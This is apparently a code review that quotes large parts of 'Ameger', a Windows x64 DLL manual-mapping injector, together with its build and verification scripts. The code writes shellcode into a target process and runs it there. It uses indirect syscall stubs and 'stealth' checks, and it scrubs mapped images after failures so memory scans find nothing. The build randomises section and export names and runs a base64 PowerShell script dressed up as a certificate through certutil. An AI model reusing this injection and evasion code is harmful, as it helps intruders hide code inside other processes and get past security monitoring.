							if (start[j] == 0xC3)
							{
								ods_ret = const_cast<BYTE *>(start + j);
								break;
							}
						}
					}
				}
			}
		}

		data.OdsReturnStub = ods_ret;
		LOG(1, "[ManualMap] [*] Debug-Print Redirect Stub: %s (ntdll Ret At %p)\n",
			ods_ret ? "Located" : "Not Found - No Import Redirection Possible", ods_ret);
	}

	LOG(2, "ShellSize      = %08X\n", MDWD(ShellSize));
	LOG(2, "Total Size     = %08X\n", MDWD(AllocationSize));
	LOG(2, "pArg           = %p\n", pArg);
	LOG(2, "pShells        = %p\n", pShells);

	LOG(2, "pDispatch      = %p\n", pFunctionTable);

	if (!WriteRemoteExact(hTargetProc, pArg, &data, sizeof(MANUAL_MAPPING_DATA)))
	{
		INIT_ERROR_DATA(error_data, INJ_ERR_ADVANCED_NOT_DEFINED);

		LOG(1, "WriteProcessMemory Failed\n");

		return INJ_ERR_WPM_FAIL;
	}

	LOG(1, "ShellData Written To Memory\n");

	if (!WriteRemoteExact(hTargetProc, pShells, mmap_sec_base, ShellSize))
	{
		INIT_ERROR_DATA(error_data, INJ_ERR_ADVANCED_NOT_DEFINED);

		LOG(1, "WriteProcessMemory Failed\n");

		return INJ_ERR_WPM_FAIL;
	}

	LOG(1, "Shells Written To Memory\n");

	if (!WriteRemoteExact(hTargetProc, pFunctionTable, table_local.get(), sizeof(MANUAL_MAPPING_FUNCTION_TABLE)))

	{
		INIT_ERROR_DATA(error_data, INJ_ERR_ADVANCED_NOT_DEFINED);

		LOG(1, "WriteProcessMemory Failed\n");

		return INJ_ERR_WPM_FAIL;
	}

	LOG(1, "Staging Dispatch Written To Memory\n");

	{
		// The RX span covers the shell *and* the whole remote stub area (the stub
		// table plus the trailing gadget slot). It is measured from the actual
		// layout rather than from exec_area_size, because the stub area starts at a
		// 16-byte aligned offset that can sit past the end of a page-rounded size.
		const SIZE_T code_bytes = static_cast<SIZE_T>((pStubArea + stub_area_size) - pShells);
		if (code_bytes)
		{
			const SIZE_T rx_span = ALIGN_UP(code_bytes, kStagePage);
			SIZE_T protected_code = 0;
			const NTSTATUS protect_status = ScProtectMemoryStatus(hTargetProc, pShells, rx_span, PAGE_EXECUTE_READ, nullptr, &protected_code);
			if (NT_FAIL(protect_status))
			{
				INIT_ERROR_DATA(error_data, (DWORD)protect_status);

				LOG(1, "Protect(RX) Failed = %08X | Span = %llx | Base = %p\n",
					protect_status, (unsigned long long)protected_code, pShells);

				return INJ_ERR_UPDATE_PROTECTION_FAILED;
			}

			if (!FlushInstructionCache(hTargetProc, pShells, rx_span))
			{
				LOG(1, "FlushInstructionCache Failed\n");
			}
			LOG(1, "Staging Code Promoted RW->RX\n");
		}
	}

	DWORD remote_ret = 0;
	DWORD dwRet = StartRoutine(hTargetProc, ReCa<f_Routine>(pShells), pArg, remote_flags, remote_ret, Timeout, SponsorThread, SponsorTid, completion_event.get(), error_data);

	LOG(1, "Return From StartRoutine\n");

	if (dwRet != SR_ERR_SUCCESS)
	{
		LOG(1, "StartRoutine Failed = %08X\n", dwRet);

		if (dwRet == SR_HT_ERR_RECOVERY_REQUIRED)
		{
			// The stub may still execute. The shell owns the image from here
			// and will free it through its cleanup path; the completion event
			// is closed by the shell as well.
			// C1: the shell owns the staging allocation from here; release the
			// host guard so its destructor cannot free it out from under the
			// still-running shell.
			leak_staging = true;
			image_guard.release();
			allocation_guard.release();
			remote_event_owned = false;

			// If that donor never runs after all, nothing in the target will
			// free these. The image - the artifact a census would see - is
			// recorded in the map statistics so the leak stays visible through
			// the telemetry export even though the host no longer owns the
			// memory; the staging allocation shares the shell's fate and is
			// reported by the same base until it settles.
			{
				MAP_STATS Retained{ };
				Retained.RetainedAllocBase = ReCa<ULONG_PTR>(image_base);
				Retained.RetainedAllocSize = static_cast<DWORD>(image_span);
				StoreMapStats(Retained);
			}
		}
		else
		{
			// Every other failure - including SR_HT_ERR_REMOTE_PENDING_TIMEOUT,
			// which only ever arrives after the donor's context was confirmed
			// rewound with the shell never started - leaves the image ours: no
			// code in the target can ever touch it again. L1: scrub before
			// releasing so the failure path does not leave the mapped image
			// behind in the target; the staging and the target-side duplicated
			// event handle are reclaimed by their own guards.
			ScrubRemoteRegion(hTargetProc, image_base, image_span, kScrubChunk);
```

```cpp
	{
		const DWORD max_sections = (limit - sec_off) / section_size;
		if (num_sections > max_sections)
		{
			num_sections = max_sections;
		}
		sec_bytes = num_sections * section_size;
	}

	DWORD structural_size = dos_bytes;
	if (nt_bytes && e_lfanew + nt_bytes > structural_size)
	{
		structural_size = e_lfanew + nt_bytes;
	}
	if (sec_bytes && sec_off + sec_bytes > structural_size)
	{
		structural_size = sec_off + sec_bytes;
	}
	// The image is only released when nothing points into it any more. If
	// the inverted function table refers to it, the image has to stay
	// mapped and the leak is reported in the map statistics.
	DWORD wipe_size = structural_size;
	if (pre_section && pre_section > wipe_size)
	{
		wipe_size = pre_section;
	}

	if (!wipe_size)
	{
		return INJ_ERR_SUCCESS;
	}

	void * base = pData->pImageBase;
	SIZE_T region = wipe_size;
	ULONG old_access = NULL;

	pData->ntRet = f->NtProtectVirtualMemory(NtCurrentProcess(), &base, &region, PAGE_READWRITE, &old_access);
	if (NT_FAIL(pData->ntRet))
	{
		return INJ_MM_ERR_UPDATE_PAGE_PROTECTION;
	}
```

## R4 — Windows 11 LDR offsets (P1)

File: `Ameger/NT/Windows11.h`, full file, lines 1-113.

```cpp
#pragma once

#include "NT/NTDefinitions.h"

typedef struct _LDR_DDAG_NODE_WIN11
{
	LIST_ENTRY				Modules;
	PLDR_SERVICE_TAG_RECORD	ServiceTagList;
	ULONG					LoadCount;
	ULONG					LoadWhileUnloadingCount;
	ULONG					LowestLink;
	PLDRP_CSLIST			Dependencies;
	PLDRP_CSLIST			IncomingDependencies;
	LDR_DDAG_STATE			State;
	SINGLE_LIST_ENTRY		CondenseLink;
	ULONG					PreorderNumber;
} LDR_DDAG_NODE_WIN11, * PLDR_DDAG_NODE_WIN11;

typedef struct _LDR_DATA_TABLE_ENTRY_WIN11
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;

	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;

	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;

	union
	{
		UCHAR FlagGroup[4];
		ULONG Flags;

		struct
		{
			ULONG PackagedBinary			: 1;
			ULONG MarkedForRemoval			: 1;
			ULONG ImageDll					: 1;
			ULONG LoadNotificationsSent		: 1;
			ULONG TelemetryEntryProcessed	: 1;
			ULONG ProcessStaticImport		: 1;
			ULONG InLegacyLists				: 1;
			ULONG InIndexes					: 1;
			ULONG ShimDll					: 1;
			ULONG InExceptionTable			: 1;
			ULONG ReservedFlags1			: 2;
			ULONG LoadInProgress			: 1;
			ULONG LoadConfigProcessed		: 1;
			ULONG EntryProcessed			: 1;
			ULONG ProtectDelayLoad			: 1;
			ULONG ReservedFlags3			: 2;
			ULONG DontCallForThreads		: 1;
			ULONG ProcessAttachCalled		: 1;
			ULONG ProcessAttachFailed		: 1;
			ULONG CorDeferredValidate		: 1;
			ULONG CorImage					: 1;
			ULONG DontRelocate				: 1;
			ULONG CorILOnly					: 1;
			ULONG ChpeImage					: 1;
			ULONG ReservedFlags5			: 2;
			ULONG Redirected				: 1;
			ULONG ReservedFlags6			: 2;
			ULONG CompatDatabaseProcessed	: 1;
		};
	};

	WORD ObsoleteLoadCount;
	WORD TlsIndex;

	LIST_ENTRY HashLinks;

	ULONG TimedateStamp;
	PVOID EntryPointActivationContext;
	PVOID Lock;

	LDR_DDAG_NODE_WIN11 * DdagNode;

	LIST_ENTRY	NodeModuleLink;
	PVOID		LoadContext;
	PVOID		ParentDllBase;
	PVOID		SwitchBackContext;

	RTL_BALANCED_NODE BaseAddressIndexNode;
	RTL_BALANCED_NODE MappingInfoIndexNode;

	ULONG_PTR			OriginalBase;
	LARGE_INTEGER		LoadTime;
	ULONG				BaseNameHashValue;
	LDR_DLL_LOAD_REASON	LoadReason;
	ULONG				ImplicitPathOptions;

	ULONG ReferenceCount;
	ULONG DependentLoadFlags;
	UCHAR SigningLevel;

	ULONG CheckSum;
	PVOID ActivePathImageBase;
	LDR_HOT_PATCH_STATE HotPatchState;
} LDR_DATA_TABLE_ENTRY_WIN11, * PLDR_DATA_TABLE_ENTRY_WIN11;

static_assert(sizeof(LDR_DDAG_NODE_WIN11) == 80);
static_assert(offsetof(LDR_DDAG_NODE_WIN11, State) == 56);
static_assert(sizeof(LDR_DATA_TABLE_ENTRY_WIN11) == 312);
static_assert(offsetof(LDR_DATA_TABLE_ENTRY_WIN11, DllBase) == 48);
static_assert(offsetof(LDR_DATA_TABLE_ENTRY_WIN11, SizeOfImage) == 64);
static_assert(offsetof(LDR_DATA_TABLE_ENTRY_WIN11, FullDllName) == 72);
static_assert(offsetof(LDR_DATA_TABLE_ENTRY_WIN11, DdagNode) == 152);
static_assert(offsetof(LDR_DATA_TABLE_ENTRY_WIN11, OriginalBase) == 248);
static_assert(offsetof(LDR_DATA_TABLE_ENTRY_WIN11, CheckSum) == 288);
static_assert(offsetof(LDR_DATA_TABLE_ENTRY_WIN11, HotPatchState) == 304);
```

## R5 — Payload pin verification (P1)

File: `Interface/Source/Main.cpp`
Ranges: lines 2280-2340 covering `PayloadSha256` config parsing, and lines 3400-3460 covering payload file inspection and SHA-256 pin verification.

```cpp
                }
                else if (!quoted && (value[i] == L';' || value[i] == L'#'))
                {
                    comment = i;
                    break;
                }
            }
            if (comment != std::wstring::npos)
            {
                value = TrimText(value.substr(0, comment));
            }
            if (value.size() >= 2 && value.front() == L'"' && value.back() == L'"')
            {
                value = value.substr(1, value.size() - 2);
            }

            const bool general = EqualsNoCase(section, XOR_STR_W(L"General").get());
            const bool manual = EqualsNoCase(section, XOR_STR_W(L"ManualMap").get());
            if (general && EqualsNoCase(key, XOR_STR_W(L"SchemaVersion").get()))
            {
                DWORD parsed = 0;
                if (ParseDword(value, parsed) && parsed <= static_cast<DWORD>(INT_MAX))
                {
                    config.schema_version = static_cast<int>(parsed);
                }
            }
            else if (general && EqualsNoCase(key, XOR_STR_W(L"ProcessName").get()))
            {
                config.target_name = value;
            }
            else if (general && EqualsNoCase(key, XOR_STR_W(L"PayloadSha256").get()))
            {
                config.expected_payload_sha256 = value;
                std::transform(config.expected_payload_sha256.begin(), config.expected_payload_sha256.end(), config.expected_payload_sha256.begin(), towupper);
            }

            else if (general && EqualsNoCase(key, XOR_STR_W(L"PayloadName").get()))
            {
                config.payload_name = value;
            }
            else if (general && EqualsNoCase(key, XOR_STR_W(L"RuntimeName").get()))
            {
                config.runtime_name = value;
            }

            else if (general && EqualsNoCase(key, XOR_STR_W(L"DllDir").get()))
            {
                if (!value.empty())
                {
                    if (!IsValidDeployedFileName(value))
                    {
                        config = WizardConfig{};
                        invalid = true;
                        return false;
                    }
                    config.dll_dir = value;
                }
            }
            else if (general && EqualsNoCase(key, XOR_STR_W(L"ExportMap").get()))
            {
                if (!ParseExportMap(value, config.export_map))
```

```cpp
        {
            PrintError(L"The Payload Is Not Configured (The Deployment Payload Name Is Empty).");
            return false;
        }

        const std::wstring path = directory + dll_dir + L"\\" + payload_name;
        if (!FileExists(path))
        {
            PrintError((L"The Payload DLL (" + payload_name + L") Is Missing In " + dll_dir + L"\\ Next To The Executable.").c_str());
            return false;
        }

        DWORD validation_code = FILE_ERR_SUCCESS;
        std::wstring sha256;
        if (!InspectDll(path, flags, info, bytes, sha256, &validation_code))
        {
            if (validation_code != FILE_ERR_SUCCESS)
            {
                LOG(0,  L"%lsNot A Usable DLL (PE Validation 0x%08X). Need x64 DLL With Relocations, No .NET.%ls\n",
                    kYellow, validation_code, kReset);
            }
            else
            {
                PrintWarning(L"Not A Usable DLL.");
            }
            return false;
        }

        if (expected_sha256.empty())
        {
            PrintError(XOR_STR_W(L"The Payload Pin Is Missing (PayloadSha256 Is Empty); Refusing To Load Without A Pinned Digest.").get());
            return false;
        }
        if (_wcsicmp(expected_sha256.c_str(), sha256.c_str()) != 0)
        {
            LOG(0,  L"%lsPayload SHA-256 Mismatch. Expected %ls, Got %ls%ls\n", kRed, expected_sha256.c_str(), sha256.c_str(), kReset);
            return false;
        }

        if (info.dotnet)
        {
            PrintError(L".NET Assemblies Are Not Supported In This Memory-Loading Build.");
            return false;
        }
        if (info.architecture == Architecture::X86)
        {
            PrintError(L"x86 DLLs Are Not Supported In This x64-Only Build.");
            return false;
        }

        if (VerboseOutputEnabled()) { LOG(0, L"Verified SHA-256 = %ls%ls%ls\n", kGreen, sha256.c_str(), kReset); }
        return true;
    }

    void ReportPayloadCapabilities(const std::vector<BYTE> & payload, DWORD flags)
    {
        if (payload.size() < sizeof(IMAGE_DOS_HEADER))
        {
            return;
        }
```

## R6 — Build verification ordering (P1)

File: `Build/Executors/Create.bat`, lines 100-260.

```bat
echo   %C_GREEN%[+]%C_RESET% Deployed Payload Name = %C_GREEN%%PAYLOAD_NAME%%C_RESET%
echo   %C_GREEN%[+]%C_RESET% Deployed Runtime Name = %C_GREEN%%RUNTIME_NAME%%C_RESET%
echo   %C_GREEN%[+]%C_RESET% Deployed Launcher Name = %C_GREEN%%EXE_NAME%.exe%C_RESET%
echo   %C_GREEN%[+]%C_RESET% Deployed DLL Folder = %C_GREEN%%DLLDIR_NAME%%C_RESET%
echo.
echo.

call :maybe_adopt_payload
if errorlevel 1 goto :payload_error

echo [%C_GREEN%4%C_RESET%/%C_GREEN%6%C_RESET%] Building Injector...
set "MUTATE_ARGS="
if /i "%AMEGER_REFUSE_UNMUTATED%"=="1" goto :seeds_ready
where powershell.exe >nul 2>&1
if errorlevel 1 goto :seeds_missing
if not exist "%SEED_SCRIPT%" goto :seeds_missing
set "AmegerMmapSentinel="
set "AmegerStringSeed="
for /f "usebackq tokens=1,2 delims==" %%A in (`powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%SEED_SCRIPT%"`) do set "%%A=%%B"
if not defined AmegerMmapSentinel goto :seeds_missing
if not defined AmegerStringSeed goto :seeds_missing
set /a "AmegerStubSeed=(%AmegerMmapSentinel%) & 0x7FFFFFFF"
if not defined AmegerStubSeed goto :seeds_missing
if "%AmegerStubSeed%"=="0" goto :seeds_missing
    set "MUTATE_ARGS=/p:AmegerMmapSentinel=%AmegerMmapSentinel% /p:AmegerStringSeed=%AmegerStringSeed% /p:AmegerStubSeed=%AmegerStubSeed%"
echo.
echo   %C_GREEN%[+]%C_RESET% Per-Build Sentinel = %C_GREEN%%AmegerMmapSentinel%%C_RESET%
echo   %C_GREEN%[+]%C_RESET% Per-Build String Seed = %C_GREEN%%AmegerStringSeed%%C_RESET%
echo.
goto :seeds_ready

:seeds_missing
echo.
echo   %C_RED%Error: Per-Build Seed Generation Failed; Refusing To Build With Fixed Seeds.%C_RESET%
goto :failure

:seeds_ready
call :build_project "%LIBRARY_PROJ%" x64 "%DEPS_RELEASE%" "%LIBRARY64_OBJ%" "%TOOLSET_ARG%" "%SDK_ARG%" "%MUTATE_ARGS%"
if errorlevel 1 goto :build_error

REM The remote mapping shell is staged into the target as one contiguous span sized from
REM (MMAP_SEC_END - ManualMapping_Shell), which is only correct if the linker merged every
REM .code$NN part into a single section. That has to be checked on the raw linker output:
REM BuildPE.ps1 randomises every section name a few lines below, so by the end of the build the
REM section is no longer called .code and the check could not find it. This is the one content
REM check that cannot be a byte scan, because an unmerged link still passes every pattern scan.
call :verify_mmap_sections "%RUNTIME_STOCK_DLL%"
if errorlevel 1 goto :verify_error
echo.
if /i "%AMEGER_REFUSE_UNMUTATED%"=="1" goto :runtime_mutate_ready
if not exist "%MUTATE_SCRIPT%" goto :runtime_mutate_missing
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%MUTATE_SCRIPT%" "%RUNTIME_STOCK_DLL%"
if errorlevel 1 goto :mutate_fatal
goto :runtime_mutate_ready

:runtime_mutate_missing
echo   %C_RED%Error: BuildPE.ps1 Was Not Found; Refusing To Continue With An Unmutated Runtime DLL.%C_RESET%
goto :failure

:runtime_mutate_ready
call :rename_exports
if errorlevel 1 goto :rename_export_error
call :write_names_state
if errorlevel 1 goto :names_state_error
where powershell.exe >nul 2>&1
if errorlevel 1 goto :hash_error
set "RUNTIME_SHA256="
set "RTSHA_TMP=%TEMP%\amg_rtsha_%RANDOM%%RANDOM%"
set "RTSHA_B64=%RTSHA_TMP%.b64"
set "RTSHA_PS1=%RTSHA_TMP%.ps1"
set "RTSHA_OUT=%RTSHA_TMP%.out"
>"%RTSHA_B64%" echo -----BEGIN CERTIFICATE-----
>>"%RTSHA_B64%" echo cGFyYW0oW3N0cmluZ10kUGF0aCkNCiRoID0gKFtCaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlNIQTI1Nl06OkNyZWF0ZSgpLkNvbXB1dGVIYXNoKFtJTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRQYXRoKSkpIC1yZXBsYWNlICctJywnJykNCldyaXRlLU91dHB1dCAoJ1JVTlRJTUVfU0hBMjU2PScgKyAkaCkNCldyaXRlLU91dHB1dCAoJ0gwPTB4JyArICRoLlN1YnN0cmluZygwLDgpKQ0KV3JpdGUtT3V0cHV0ICgnSDE9MHgnICsgJGguU3Vic3RyaW5nKDgsOCkpDQpXcml0ZS1PdXRwdXQgKCdIMj0weCcgKyAkaC5TdWJzdHJpbmcoMTYsOCkpDQpXcml0ZS1PdXRwdXQgKCdIMz0weCcgKyAkaC5TdWJzdHJpbmcoMjQsOCkpDQpXcml0ZS1PdXRwdXQgKCdIND0weCcgKyAkaC5TdWJzdHJpbmcoMzIsOCkpDQpXcml0ZS1PdXRwdXQgKCdINT0weCcgKyAkaC5TdWJzdHJpbmcoNDAsOCkpDQpXcml0ZS1PdXRwdXQgKCdINj0weCcgKyAkaC5TdWJzdHJpbmcoNDgsOCkpDQpXcml0ZS1PdXRwdXQgKCdINz0weCcgKyAkaC5TdWJzdHJpbmcoNTYsOCkpDQo=
-----END CERTIFICATE-----
certutil -decode "%RTSHA_B64%" "%RTSHA_PS1%" >nul 2>&1
if errorlevel 1 goto :rtsha_cleanup
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%RTSHA_PS1%" -Path "%RUNTIME_STOCK_DLL%" >"%RTSHA_OUT%" 2>&1
for /f "usebackq tokens=1,2 delims==" %%A in ("%RTSHA_OUT%") do set "%%A=%%B"
:rtsha_cleanup
if exist "%RTSHA_PS1%" del /f /q "%RTSHA_PS1%" >nul 2>&1
if exist "%RTSHA_B64%" del /f /q "%RTSHA_B64%" >nul 2>&1
if exist "%RTSHA_OUT%" del /f /q "%RTSHA_OUT%" >nul 2>&1
if not defined RUNTIME_SHA256 goto :hash_error
if not defined H0 goto :hash_error
if not defined H1 goto :hash_error
if not defined H2 goto :hash_error
if not defined H3 goto :hash_error
if not defined H4 goto :hash_error
if not defined H5 goto :hash_error
if not defined H6 goto :hash_error
if not defined H7 goto :hash_error
set "RUNTIME_HASH_ARGS=/p:AmegerRuntimeHash0=%H0% /p:AmegerRuntimeHash1=%H1% /p:AmegerRuntimeHash2=%H2% /p:AmegerRuntimeHash3=%H3% /p:AmegerRuntimeHash4=%H4% /p:AmegerRuntimeHash5=%H5% /p:AmegerRuntimeHash6=%H6% /p:AmegerRuntimeHash7=%H7% /p:AmegerStringSeed=%AmegerStringSeed% /p:AmegerExeName=%EXE_NAME% /p:AmegerConfigMagic=%CONFIG_MAGIC%"
set "RUNTIME_DLL_NAME=%RUNTIME_NAME%"
set "RUNTIME_DLL=%DLL_DIR%\%RUNTIME_DLL_NAME%"
if not exist "%DLL_DIR%" mkdir "%DLL_DIR%"
move /y "%RUNTIME_STOCK_DLL%" "%RUNTIME_DLL%" >nul
if not exist "%RUNTIME_DLL%" goto :runtime_rename_error
echo   %C_GREEN%[+]%C_RESET% Runtime SHA-256 = %RUNTIME_SHA256%
echo.
call :build_project "%INTERFACE_PROJ%" x64 "%OUT64%" "%INTERFACE64_OBJ%" "%TOOLSET_ARG%" "%SDK_ARG%" "%RUNTIME_HASH_ARGS%"
if errorlevel 1 goto :build_error
echo.
echo.

echo [%C_GREEN%5%C_RESET%/%C_GREEN%6%C_RESET%] Deploying Release Binaries...
echo.
echo   %C_GREEN%[+]%C_RESET% Runtime Binaries Are In %C_GREEN%%OUT_ROOT%%C_RESET%.
call :deploy_payload
if errorlevel 1 goto :payload_error
call :protect_config
if errorlevel 1 goto :config_error
echo.
echo.

echo [%C_GREEN%6%C_RESET%/%C_GREEN%6%C_RESET%] Sweeping Intermediates Into Cache And Verifying...
echo.
set "EXE_COUNT=0"
for %%F in ("%OUT64%\*.exe") do set /a "EXE_COUNT+=1"
if not "%EXE_COUNT%"=="1" (
  echo   %C_RED%Error: Expected Exactly One Launcher EXE In %OUT64%, Found %EXE_COUNT%.%C_RESET%
  goto :verify_error
)
if not exist "%INTERFACE_EXE%" (
  echo   %C_RED%Error: Expected Launcher Missing: %INTERFACE_EXE%%C_RESET%
  goto :verify_error
)
call :verify "%INTERFACE_EXE%" "x64 Interface"
if errorlevel 1 goto :verify_error
call :verify_embed
if errorlevel 1 goto :verify_content_error
call :verify_config_magic
if errorlevel 1 goto :verify_content_error
call :verify_deployed_pin
if errorlevel 1 goto :verify_content_error
call :verify_config_keys
if errorlevel 1 goto :verify_content_error
call :verify "%RUNTIME_DLL%" "x64 runtime"
if errorlevel 1 goto :verify_error
call :verify_syscall_stub
if errorlevel 1 goto :verify_content_error
call :verify_syscall_payload
if errorlevel 1 goto :verify_content_error
call :verify_syscall_stealth
if errorlevel 1 goto :verify_content_error
call :verify_export_names "%RUNTIME_DLL%"
if errorlevel 1 goto :verify_content_error
echo.
echo   %C_GREEN%[+]%C_RESET% SyscallStub         = %C_GREEN%OK%C_RESET%
echo   %C_GREEN%[+]%C_RESET% SyscallPayload      = %C_GREEN%OK%C_RESET%
echo   %C_GREEN%[+]%C_RESET% SyscallStealth      = %C_GREEN%OK%C_RESET%
echo.
call :remove_import_artifacts "%DEPS_RELEASE%"
if errorlevel 1 goto :cleanup_error
call :remove_import_artifacts "%DLL_DIR%"
if errorlevel 1 goto :cleanup_error
call :sweep_artifacts
if errorlevel 1 goto :cleanup_error
echo.
echo   %C_GREEN%[+]%C_RESET% Cache Groups = Runtime, Injector.
echo.
echo.
```

File: `Build/Scripts/VerifySyscallsLayer.ps1`, full file, lines 1-263.

```powershell
param(
    [Parameter(Mandatory = $true)]
    [ValidateSet("Stub", "Payload", "Stealth", "MmapSections")]
    [string]$Check,

    [Parameter(Mandatory = $true)]
    [string]$Path
)

$ErrorActionPreference = "Stop"

$script:UseColor = -not [Console]::IsOutputRedirected
$script:Esc = [char]27
$script:C_Green = "$($script:Esc)[92m"
$script:C_Red = "$($script:Esc)[91m"
$script:C_Dim = "$($script:Esc)[90m"
$script:C_Reset = "$($script:Esc)[0m"

function Get-Painted([string]$Color, [string]$Text) {
    if (-not $script:UseColor) { return $Text }
    return ($Color + $Text + $script:C_Reset)
}

function Write-Ok([string]$Text) {
    Write-Host ("  " + (Get-Painted $script:C_Green "OK") + " " + $Text)
}

function Write-Fail([string]$Text) {
    Write-Host ("  " + (Get-Painted $script:C_Red "[x]") + " " + $Text)
}



function Get-ByteMatches([byte[]]$Hay, [int[]]$Needle) {
    $count = 0
    $last = $Hay.Length - $Needle.Length
    for ($i = 0; $i -le $last; $i++) {
        $ok = $true
        for ($j = 0; $j -lt $Needle.Length; $j++) {
            if ($Needle[$j] -ge 0 -and $Hay[$i + $j] -ne $Needle[$j]) { $ok = $false; break }
        }
        if ($ok) { $count++ }
    }
    return $count
}

if (-not (Test-Path -LiteralPath $Path)) {
    Write-Fail ("Not Found: " + $Path)
    exit 1
}

$data = [IO.File]::ReadAllBytes($Path)


# The emitted stub is not one fixed byte pattern. WriteStub() selects between two
# "mov r10, rcx" encodings and writes either a direct (0F 05 C3) or indirect
# (FF 25 <disp32>) tail. The compiler also materialises the prologue bytes as immediate
# stores rather than a contiguous run, so this checks each piece independently instead of
# requiring one template.
$prologueA = [int[]](0x4C, 0x8B, 0xD1)
$prologueB = [int[]](0x49, 0x89, 0xCA)
$tailIndirect = [int[]](0xFF, 0x25)
$movEaxImm32 = [int[]](0xB8)

$healthyPrologue = [int[]](0x4C, 0x8B, 0xD1, 0xB8)


$keystreamConstant = [int[]](0x15, 0x7C, 0x4A, 0x7F, 0xB9, 0x79, 0x37, 0x9E)
$keystreamAlt      = [int[]](0xB9, 0xE5, 0xE4, 0x1C, 0x6D, 0x47, 0x58, 0xBF)
$keystreamAlt2     = [int[]](0xEB, 0x11, 0x31, 0x13, 0xBB, 0x49, 0xD0, 0x94)

if ($Check -eq "Stub") {
    $pA = Get-ByteMatches $data $prologueA
    $pB = Get-ByteMatches $data $prologueB
    if ($pA -lt 1 -or $pB -lt 1) {
        Write-Fail "Syscall Stub Prologue Encoding Missing (mov r10,rcx A=$pA B=$pB)"
        exit 1
    }
    Write-Ok ("Syscall Stub Prologues Present (A=$pA B=$pB)")

    $tI = Get-ByteMatches $data $tailIndirect
    if ($tI -lt 1) {
        Write-Fail "Syscall Stub Indirect Tail (FF 25) Missing; The Pool Is Not Using Gadget Indirection"
        exit 1
    }
    Write-Ok ("Syscall Stub Indirect Tail Present ($tI Match)")

    $movE = Get-ByteMatches $data $movEaxImm32
    if ($movE -lt 1) {
        Write-Fail "mov eax, imm32 Opcode (B8) Missing; The SSN Load Would Be Inert"
        exit 1
    }
    Write-Ok ("Syscall SSN Load Opcode Present ($movE Match)")

    $prologueCount = Get-ByteMatches $data $healthyPrologue
    if ($prologueCount -lt 1) {
        Write-Fail "ntdll Healthy-Prologue Comparison Constant Not Present"
        exit 1
    }
    Write-Ok ("Resolver Prologue Constant Present (" + $prologueCount + " Match)")

    $syscallOp = [int[]](0x0F, 0x05)
    $opCount = Get-ByteMatches $data $syscallOp
    Write-Ok ("Syscall Opcode Resolver Probe Present (" + $opCount + " Match)")
}

if ($Check -eq "Payload") {

    # A6 removed the raw-payload transfer: the host maps the finished image at
    # its final address and no keystream is ever mixed. These constants are the
    # old transfer encoder; finding one means the superseded path is still
    # compiled into the runtime.
    $k1 = Get-ByteMatches $data $keystreamConstant
    $k2 = Get-ByteMatches $data $keystreamAlt
    $k3 = Get-ByteMatches $data $keystreamAlt2
    if (($k1 + $k2 + $k3) -gt 0) {
        Write-Fail "Legacy Payload Keystream Constants Still Present; The Raw-Payload Transfer Path Was Not Removed (K1 = $k1 | K2 = $k2 | K3 = $k3)"
        exit 1
    }
    Write-Ok "Raw-Payload Transfer Path Removed (Keystream Constants Absent)"

    # Positive attestation for the split: the host-map log marker, the per-stage
    # timing marker, and the completion-event marker all live in the new code.
    $hostMapNeedle = [int[]][Text.Encoding]::ASCII.GetBytes("Host Map: Image Mapped")
    $stageNeedle = [int[]][Text.Encoding]::ASCII.GetBytes("Shell Stages:")
    $eventNeedle = [int[]][Text.Encoding]::ASCII.GetBytes("Completion Event")
    $hostMap = Get-ByteMatches $data $hostMapNeedle
    $stages = Get-ByteMatches $data $stageNeedle
    $events = Get-ByteMatches $data $eventNeedle
    if (($hostMap -lt 1) -or ($stages -lt 1) -or ($events -lt 1)) {
        Write-Fail ("A6 Host-Mapped Shell Markers Missing (HostMap = " + $hostMap + " | Stages = " + $stages + " | Completion = " + $events + ")")
        exit 1
    }
    Write-Ok ("A6 Host-Mapped Shell Present (HostMap = " + $hostMap + " | Stages = " + $stages + " | Completion = " + $events + ")")
}

if ($Check -eq "Stealth") {




    $shadow = [int[]](0x48, 0x89, 0x4C, 0x24, 0x20)
    $r9rx   = [int[]](0x41, 0xB9, 0x20, 0x00, 0x00, 0x00)
    $r9na   = [int[]](0x41, 0xB9, 0x01, 0x00, 0x00, 0x00)
    $r9rwx  = [int[]](0x41, 0xB9, 0x40, 0x00, 0x00, 0x00)

    $rx  = (Get-ByteMatches $data ([int[]]($shadow + $r9rx)))  + (Get-ByteMatches $data ([int[]]($r9rx + $shadow)))
    $na  = (Get-ByteMatches $data ([int[]]($shadow + $r9na)))  + (Get-ByteMatches $data ([int[]]($r9na + $shadow)))
    $rwx = (Get-ByteMatches $data ([int[]]($shadow + $r9rwx))) + (Get-ByteMatches $data ([int[]]($r9rwx + $shadow)))

    if (($rx -lt 1) -or ($na -lt 1)) {
        Write-Fail "W^X Protection Sequences Missing (PAGE_EXECUTE_READ / PAGE_NOACCESS Into NtProtectVirtualMemory)"
        exit 1
    }
    if ($rwx -gt 0) {
        Write-Host ("  [*] W^X Static Heuristic: " + $rwx + " Adjacent mov r9d,0x40 Sequence(s); Source Review Confirms No PAGE_EXECUTE_READWRITE Protect Request. Live Verifier Is Authoritative.")
    }
    Write-Ok ("W^X Protect Sequences Present (RX = " + $rx + " | NOACCESS = " + $na + " | RWX = " + $rwx + ")")

    Write-Host ("  " + (Get-Painted $script:C_Dim "Static Verification Only; Live Properties Are Checked By The Runtime Verify Tool"))
}

if ($Check -eq "MmapSections") {










    if ($data.Length -lt 64 -or $data[0] -ne 0x4D -or $data[1] -ne 0x5A) {
        Write-Fail "Not An MZ Image"
        exit 1
    }

    $e = [BitConverter]::ToInt32($data, 0x3C)
    if ($e -le 0 -or ($e + 24) -gt $data.Length) { Write-Fail "Bad e_lfanew"; exit 1 }
    if ([BitConverter]::ToUInt32($data, $e) -ne 0x00004550) { Write-Fail "Not PE"; exit 1 }

    $coff = $e + 4
    $nsec = [BitConverter]::ToUInt16($data, $coff + 2)
    $optSize = [BitConverter]::ToUInt16($data, $coff + 16)
    $opt = $e + 24
